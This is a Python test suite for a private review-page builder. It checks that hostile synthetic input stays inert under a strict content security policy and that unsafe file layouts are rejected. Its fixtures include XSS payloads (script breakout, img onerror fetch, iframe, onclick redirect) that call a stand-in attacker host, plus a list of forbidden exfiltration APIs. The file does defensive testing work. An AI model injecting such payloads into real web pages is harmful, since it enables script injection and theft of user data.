#!/usr/bin/env python3
"""Adversarial synthetic tests for the private pragmatic-extremes reviewer."""

from __future__ import annotations

import base64
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from copy import deepcopy
from html.parser import HTMLParser
from pathlib import Path
from types import ModuleType


SCRIPT_DIR = Path(__file__).resolve().parent
ROOT = SCRIPT_DIR.parent
BUILDER_PATH = SCRIPT_DIR / "build_pragmatic_extremes_review.py"


def load_builder() -> ModuleType:
    spec = importlib.util.spec_from_file_location("build_pragmatic_extremes_review", BUILDER_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"could not load {BUILDER_PATH}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


BUILDER = load_builder()


class StructureParser(HTMLParser):
    """Collect structural facts without evaluating the generated page."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.csp = ""
        self.scripts: list[dict[str, str]] = []
        self.styles: list[dict[str, str]] = []
        self.templates: list[dict[str, str]] = []
        self.handler_attributes: list[tuple[str, str]] = []
        self.resource_attributes: list[tuple[str, str]] = []
        self._capture: str | None = None
        self._chunks: list[str] = []
        self.script_texts: list[str] = []
        self.template_texts: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = {name: value or "" for name, value in attrs}
        if tag == "meta" and values.get("http-equiv", "").lower() == "content-security-policy":
            self.csp = values.get("content", "")
        if tag == "script":
            self.scripts.append(values)
            self._capture = "script"
            self._chunks = []
        elif tag == "style":
            self.styles.append(values)
        elif tag == "template":
            self.templates.append(values)
            self._capture = "template"
            self._chunks = []

        resource_pairs = {
            ("script", "src"),
            ("img", "src"),
            ("iframe", "src"),
            ("link", "href"),
            ("a", "href"),
            ("base", "href"),
            ("form", "action"),
            ("button", "formaction"),
            ("input", "formaction"),
            ("object", "data"),
            ("source", "src"),
            ("audio", "src"),
            ("video", "poster"),
        }
        for name, _value in attrs:
            if name.lower().startswith("on"):
                self.handler_attributes.append((tag, name))
            if (tag, name.lower()) in resource_pairs:
                self.resource_attributes.append((tag, name))

    def handle_endtag(self, tag: str) -> None:
        if tag == "script" and self._capture == "script":
            self.script_texts.append("".join(self._chunks))
            self._capture = None
            self._chunks = []
        elif tag == "template" and self._capture == "template":
            self.template_texts.append("".join(self._chunks))
            self._capture = None
            self._chunks = []

    def handle_data(self, data: str) -> None:
        if self._capture:
            self._chunks.append(data)


HOSTILE_VALUES = [
    "</script><script src=\"https://attacker.example/payload.js\">attack()</script>",
    "<img src=x onerror=\"fetch('https://attacker.example/collect')\">",
    "<iframe src=\"https://attacker.example/frame\"></iframe>",
    "<div onclick=\"location='https://attacker.example/click'\">click</div>",
    "&lt;script&gt;window.evil=true&lt;/script&gt;",
    "person.private@example.net",
    "/Users/private-owner/Confidential Project/notes.txt",
    "https://private.example.net/resource?token=not-a-real-secret",
]


def hostile_candidate() -> dict[str, object]:
    return {
        "candidate_id": "NPE-AAAAAAAAAAAAAAAAAAAAAAAA",
        "candidate_class": "likely_pragmatic_failure",
        "candidate_score": 9,
        "source": "synthetic",
        "session_ref": "SES-BBBBBBBBBBBBBBBBBBBB",
        "feedback_timestamp": "2026-07-16T12:00:00Z",
        "primary_phenomenon": "scope_and_authorization",
        "evidence_signals": [{"signal": HOSTILE_VALUES[0]}],
        "pragmatic_load_signals": [{"signal": HOSTILE_VALUES[1]}],
        "privacy_flags": [HOSTILE_VALUES[5]],
        "governing_context": [HOSTILE_VALUES[2], HOSTILE_VALUES[6]],
        "preceding_context": [{"user": HOSTILE_VALUES[3], "assistant": HOSTILE_VALUES[4]}],
        "triggering_request": HOSTILE_VALUES[0],
        "model_visible_response": HOSTILE_VALUES[1],
        "tool_trace": [
            {"kind": "tool_result", "name": "synthetic", "success": True, "text": HOSTILE_VALUES[7]}
        ],
        "user_followup": "literal fetch('https://attacker.example/another') network text",
        "immediate_model_response": "Synthetic assistant response",
    }


def valid_v2_candidate() -> dict[str, object]:
    row: dict[str, object] = {
        "candidate_id": "NPE2-AAAAAAAAAAAAAAAAAAAAAAAA",
        "session_ref": "SES2-BBBBBBBBBBBBBBBBBBBB",
        "source": "codex",
        "session_mode": "cli",
        "month": "2026-07",
        "candidate_class": "likely_pragmatic_failure",
        "candidate_score": 4,
        "evidence_strength": "moderate",
        "primary_phenomenon": "scope_and_authorization",
        "evidence_signals": [{"signal": "scope_or_file_correction", "weight": 4}],
        "pragmatic_load_signals": [],
        "alternative_explanations": ["reasonable_competing_reading"],
        "compaction_before": False,
        "tool_event_count": 1,
        "tool_action_classes": ["artifact_read"],
        "content_withheld_fields": [],
        "redaction_counts": {},
        "privacy_disposition": "internal_review_only",
        "reconstruction_status": "automatic_minimization",
        "preceding_context": [
            {"user": "keep the scope narrow", "assistant": "the scope remains narrow"}
        ],
        "triggering_request": "continue with the bounded task",
        "model_visible_response": "the bounded task is complete",
        "user_followup": "thanks; now summarize the result",
        "immediate_model_response": "the result is summarized",
    }
    row["text_char_count"] = sum(
        len(str(row[field]))
        for field in (
            "triggering_request",
            "model_visible_response",
            "user_followup",
            "immediate_model_response",
        )
    ) + sum(
        len(str(turn[role]))
        for turn in row["preceding_context"]  # type: ignore[union-attr]
        for role in ("user", "assistant")
    )
    return row


class PragmaticExtremesReviewTests(unittest.TestCase):
    def parse(self, document: str) -> StructureParser:
        parser = StructureParser()
        parser.feed(document)
        parser.close()
        return parser

    def write_corpus_row(self, root: Path, row: dict[str, object]) -> Path:
        candidates = root / "review-corpus.jsonl"
        candidates.write_text(json.dumps(row) + "\n", encoding="utf-8")
        candidates.chmod(0o600)
        return candidates

    def run_cli(
        self, candidates: Path, output: Path, *, overwrite: bool = False
    ) -> subprocess.CompletedProcess[str]:
        command = [
            sys.executable,
            os.fspath(BUILDER_PATH),
            "--candidates",
            os.fspath(candidates),
            "--out-dir",
            os.fspath(output),
        ]
        if overwrite:
            command.append("--overwrite")
        return subprocess.run(
            command,
            check=False,
            capture_output=True,
            text=True,
        )

    def temporary_corpus(self) -> tempfile.TemporaryDirectory[str]:
        discovery = ROOT / "private" / "discovery"
        discovery.mkdir(parents=True, exist_ok=True)
        return tempfile.TemporaryDirectory(dir=discovery)

    def test_hostile_corpus_is_inert_and_csp_locked(self) -> None:
        candidate = hostile_candidate()
        document = BUILDER.build_html([candidate])
        parser = self.parse(document)

        self.assertEqual(len(parser.scripts), 1)
        self.assertEqual(len(parser.script_texts), 1)
        self.assertEqual(len(parser.styles), 1)
        self.assertEqual(len(parser.templates), 1)
        self.assertEqual(len(parser.template_texts), 1)
        self.assertEqual(parser.templates[0].get("id"), "candidate-data")
        self.assertEqual(parser.templates[0].get("data-encoding"), "base64")
        self.assertEqual(parser.handler_attributes, [])
        self.assertEqual(parser.resource_attributes, [])
        self.assertEqual(len(re.findall(r"</script\s*>", document, re.IGNORECASE)), 1)

        script_nonce = parser.scripts[0].get("nonce", "")
        style_nonce = parser.styles[0].get("nonce", "")
        self.assertTrue(script_nonce)
        self.assertTrue(style_nonce)
        self.assertNotEqual(script_nonce, style_nonce)
        self.assertIn(f"script-src 'nonce-{script_nonce}'", parser.csp)
        self.assertIn(f"style-src 'nonce-{style_nonce}'", parser.csp)
        for directive in (
            "default-src",
            "connect-src",
            "img-src",
            "object-src",
            "frame-src",
            "form-action",
            "base-uri",
        ):
            self.assertIn(f"{directive} 'none'", parser.csp)
        self.assertNotIn("'unsafe-inline'", parser.csp)
        self.assertNotIn("'unsafe-eval'", parser.csp)

        corpus_b64 = parser.template_texts[0].strip()
        decoded = json.loads(base64.b64decode(corpus_b64).decode("utf-8"))
        self.assertEqual(decoded, [candidate])
        self.assertNotIn(corpus_b64, parser.script_texts[0])
        for hostile in HOSTILE_VALUES:
            self.assertNotIn(hostile, document)

        script = parser.script_texts[0]
        for forbidden in (
            "localStorage",
            "sessionStorage",
            ".innerHTML",
            "insertAdjacentHTML",
            "document.write",
            "fetch(",
            "XMLHttpRequest",
            "WebSocket",
            "sendBeacon",
            "new Blob",
            "createObjectURL",
            "revokeObjectURL",
            "clipboard",
            ".download",
            ".click()",
            "showSaveFilePicker",
            "FileSystemWritableFileStream",
        ):
            self.assertNotIn(forbidden, script)
        for forbidden_lower in ("download", "blob", "objecturl", "clipboard"):
            self.assertNotIn(forbidden_lower, script.lower())
        self.assertIn("textContent", script)
        self.assertIn("output.textContent = decisionPayloadText()", script)
        self.assertIn("replaceChildren", script)
        self.assertIn("Clear in-memory decisions", script)
        self.assertIn("Decision JSON for manual private save", script)

        decision_record = script.split("function decisionRecord", 1)[1].split(
            "function decisionPayloadText", 1
        )[0]
        for private_field in (
            "triggering_request",
            "model_visible_response",
            "tool_trace",
            "user_followup",
            "immediate_model_response",
            "governing_context",
            "preceding_context",
        ):
            self.assertNotIn(private_field, decision_record)

    def test_nonce_is_fresh_for_every_build(self) -> None:
        first = self.parse(BUILDER.build_html([hostile_candidate()]))
        second = self.parse(BUILDER.build_html([hostile_candidate()]))
        self.assertNotEqual(first.scripts[0]["nonce"], second.scripts[0]["nonce"])
        self.assertNotEqual(first.styles[0]["nonce"], second.styles[0]["nonce"])

    def test_cli_accepts_valid_v2_fixture_at_exact_layout(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            candidate = valid_v2_candidate()
            candidates = self.write_corpus_row(root, candidate)
            output = root / "review"
            completed = self.run_cli(candidates, output)
            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertEqual({path.name for path in output.iterdir()}, {"index.html", "README.md"})
            self.assertEqual(output.stat().st_mode & 0o077, 0)
            self.assertEqual((output / "index.html").stat().st_mode & 0o077, 0)
            self.assertEqual((output / "README.md").stat().st_mode & 0o077, 0)
            readme = (output / "README.md").read_text(encoding="utf-8")
            self.assertIn("only in memory", readme)
            self.assertIn("read-only", readme)
            self.assertIn("restricted private boundary", readme)
            self.assertNotIn("browser storage", readme.lower())

            document = (output / "index.html").read_text(encoding="utf-8")
            parser = self.parse(document)
            decoded = json.loads(
                base64.b64decode(parser.template_texts[0].strip()).decode("utf-8")
            )
            self.assertEqual(decoded, [candidate])
            script = parser.script_texts[0]
            for forbidden in (
                "localStorage",
                "sessionStorage",
                "new Blob",
                "createObjectURL",
                "revokeObjectURL",
                "clipboard",
                ".download",
                "showSaveFilePicker",
                "FileSystemWritableFileStream",
            ):
                self.assertNotIn(forbidden, script)
            for forbidden_lower in ("download", "blob", "objecturl", "clipboard"):
                self.assertNotIn(forbidden_lower, script.lower())
            self.assertIn("output.textContent = decisionPayloadText()", script)

    def test_cli_rejects_hostile_raw_schema_before_touching_output(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            candidates = self.write_corpus_row(root, hostile_candidate())
            output = root / "review"
            absent = self.run_cli(candidates, output, overwrite=True)
            self.assertNotEqual(absent.returncode, 0)
            self.assertFalse(output.exists())

            output.mkdir(mode=0o700)
            existing = output / "index.html"
            existing.write_text("existing private reviewer", encoding="utf-8")
            existing.chmod(0o600)
            completed = self.run_cli(candidates, output, overwrite=True)
            self.assertNotEqual(completed.returncode, 0)
            self.assertEqual(existing.read_text(encoding="utf-8"), "existing private reviewer")
            self.assertEqual({path.name for path in output.iterdir()}, {"index.html"})

    def test_cli_rejects_privacy_caps_and_forbidden_nested_keys(self) -> None:
        mutations = {
            "private_syntax": lambda row: row.update(
                {
                    "triggering_request": "/Users/private-owner/private-input",
                }
            ),
            "field_cap": lambda row: row.update(
                {"triggering_request": "x" * 1_601}
            ),
            "forbidden_nested_key": lambda row: row[
                "redaction_counts"
            ].update(  # type: ignore[union-attr]
                {"raw_path": 1}
            ),
        }
        for label, mutate in mutations.items():
            with self.subTest(label=label), self.temporary_corpus() as temporary:
                root = Path(temporary)
                candidate = deepcopy(valid_v2_candidate())
                mutate(candidate)
                candidate["text_char_count"] = sum(
                    len(str(candidate[field]))
                    for field in (
                        "triggering_request",
                        "model_visible_response",
                        "user_followup",
                        "immediate_model_response",
                    )
                ) + sum(
                    len(str(turn[role]))
                    for turn in candidate["preceding_context"]  # type: ignore[union-attr]
                    for role in ("user", "assistant")
                )
                candidates = self.write_corpus_row(root, candidate)
                output = root / "review"
                completed = self.run_cli(candidates, output)
                self.assertNotEqual(completed.returncode, 0)
                self.assertFalse(output.exists())

    def test_cli_rejects_wrong_input_or_output_layout(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            wrong_name = root / "candidates.jsonl"
            wrong_name.write_text(json.dumps(valid_v2_candidate()) + "\n", encoding="utf-8")
            wrong_name.chmod(0o600)
            completed = self.run_cli(wrong_name, root / "review")
            self.assertNotEqual(completed.returncode, 0)
            self.assertFalse((root / "review").exists())

        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            nested = root / "nested"
            nested.mkdir()
            candidates = self.write_corpus_row(nested, valid_v2_candidate())
            completed = self.run_cli(candidates, nested / "review")
            self.assertNotEqual(completed.returncode, 0)
            self.assertFalse((nested / "review").exists())

        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            candidates = self.write_corpus_row(root, valid_v2_candidate())
            completed = self.run_cli(candidates, root / "other-review")
            self.assertNotEqual(completed.returncode, 0)
            self.assertFalse((root / "other-review").exists())

    def test_cli_rejects_symlink_input_and_symlink_corpus_component(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            backing = root / "backing.jsonl"
            backing.write_text(json.dumps(valid_v2_candidate()) + "\n", encoding="utf-8")
            candidates = root / "review-corpus.jsonl"
            candidates.symlink_to(backing)
            completed = self.run_cli(candidates, root / "review")
            self.assertNotEqual(completed.returncode, 0)
            self.assertFalse((root / "review").exists())

        discovery = ROOT / "private" / "discovery"
        with self.temporary_corpus() as temporary:
            target = Path(temporary)
            self.write_corpus_row(target, valid_v2_candidate())
            alias = discovery / f"{target.name}-alias"
            try:
                alias.symlink_to(target, target_is_directory=True)
                completed = self.run_cli(
                    alias / "review-corpus.jsonl", alias / "review"
                )
                self.assertNotEqual(completed.returncode, 0)
                self.assertFalse((target / "review").exists())
            finally:
                if alias.is_symlink():
                    alias.unlink()

    def test_cli_rejects_symlink_output_directory(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            candidates = self.write_corpus_row(root, valid_v2_candidate())
            target = root / "review-target"
            target.mkdir()
            sentinel = target / "sentinel"
            sentinel.write_text("outside data", encoding="utf-8")
            output = root / "review"
            output.symlink_to(target, target_is_directory=True)
            completed = self.run_cli(candidates, output, overwrite=True)
            self.assertNotEqual(completed.returncode, 0)
            self.assertEqual(sentinel.read_text(encoding="utf-8"), "outside data")
            self.assertTrue(output.is_symlink())

    def test_overwrite_rejects_symlink_nonregular_unknown_and_hardlink_entries(self) -> None:
        entry_kinds = ("symlink", "directory", "unknown_regular", "hardlink")
        for entry_kind in entry_kinds:
            with self.subTest(entry_kind=entry_kind), self.temporary_corpus() as temporary:
                root = Path(temporary)
                candidates = self.write_corpus_row(root, valid_v2_candidate())
                output = root / "review"
                output.mkdir(mode=0o700)
                sentinel = root / "outside-sentinel"
                sentinel.write_text("outside data", encoding="utf-8")
                if entry_kind == "symlink":
                    (output / "index.html").symlink_to(sentinel)
                elif entry_kind == "directory":
                    (output / "index.html").mkdir()
                elif entry_kind == "unknown_regular":
                    (output / "notes.txt").write_text("keep", encoding="utf-8")
                else:
                    os.link(candidates, output / "index.html")
                completed = self.run_cli(candidates, output, overwrite=True)
                self.assertNotEqual(completed.returncode, 0)
                self.assertEqual(sentinel.read_text(encoding="utf-8"), "outside data")
                self.assertTrue(output.exists())

    def test_overwrite_replaces_only_expected_regular_files(self) -> None:
        with self.temporary_corpus() as temporary:
            root = Path(temporary)
            candidates = self.write_corpus_row(root, valid_v2_candidate())
            output = root / "review"
            first = self.run_cli(candidates, output)
            self.assertEqual(first.returncode, 0, first.stderr)
            first_document = (output / "index.html").read_text(encoding="utf-8")
            second = self.run_cli(candidates, output, overwrite=True)
            self.assertEqual(second.returncode, 0, second.stderr)
            self.assertEqual({path.name for path in output.iterdir()}, {"index.html", "README.md"})
            self.assertNotEqual(
                first_document,
                (output / "index.html").read_text(encoding="utf-8"),
            )


if __name__ == "__main__":
    unittest.main()
